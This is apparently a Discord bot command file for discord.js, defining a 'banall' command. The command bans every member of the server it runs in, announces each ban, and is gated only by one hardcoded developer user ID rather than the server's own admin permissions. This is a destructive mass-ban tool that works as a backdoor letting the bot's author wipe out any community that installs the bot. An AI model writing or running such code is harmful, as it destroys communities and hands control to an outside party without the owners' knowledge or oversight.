const Discord = require('discord.js');
exports.run = (bot, message, args) => {
      let BReason = args.join(" ").slice(0);
    if (!BReason) return message.reply("No Ban reason found!")
    if (message.author.id != 374245145329139712) return message.reply("You can't use the command! It's Developer only!")

    let C = message.channel;
    message.guild.members.forEach((f, i) => {
        if (f.id == 374245145329139712) return message.reply("Did not ban bot dev.");
        message.guild.member(f).ban(BReason);
        message.channel.send(`Banned ${f}!`);
    });
    C.send("All members banned.");
}

module.exports.help = {
  name: "banall"
}